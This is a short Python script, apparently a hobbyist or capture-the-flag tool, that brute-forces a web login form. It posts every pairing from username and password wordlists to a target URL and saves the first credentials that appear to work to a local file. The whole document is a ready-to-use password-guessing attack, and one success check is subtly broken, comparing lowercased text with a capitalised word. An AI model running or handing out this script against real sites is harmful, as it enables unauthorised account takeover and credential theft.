# this script fuzzes username and password using your own lists
# add URL and cookies, you can also modify request timing and the conditions to detect code == 200

import requests
import time
import sys

with open('username.txt', 'r') as user_file:
    usernames = [line.strip() for line in user_file if line.strip()]

with open('password.txt', 'r') as pass_file:
    passwords = [line.strip() for line in pass_file if line.strip()]

cookies = {
    "session": "",
}

url = ""

DELAY = 0.5
TIMEOUT = 6

print(f"starting attack...")

count = 0
ruta_archivo = "/home///credenciales.txt"

for username in usernames:
    for password in passwords:
        count += 1

        data = {
            "username": username,
            "password": password
        }

        if count % 10 == 0:
            print(f"attempts made: {count}")
        print(f"Trying: {username}:{password}")
        
        try:
            response = requests.post(url, data=data, cookies=cookies, timeout=TIMEOUT)

            if response.status_code == 200:
                if "Welcome" in response.text.lower() or "dashboard" in response.text.lower():
                    print(f"Find: User: {username}, Password: {password}")
                    with open(ruta_archivo, 'w') as f:
                        f.write(f"User: {username}\nPassword: {password}")
                    sys.exit(0)  
                    
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(DELAY)

print("Process Completes")
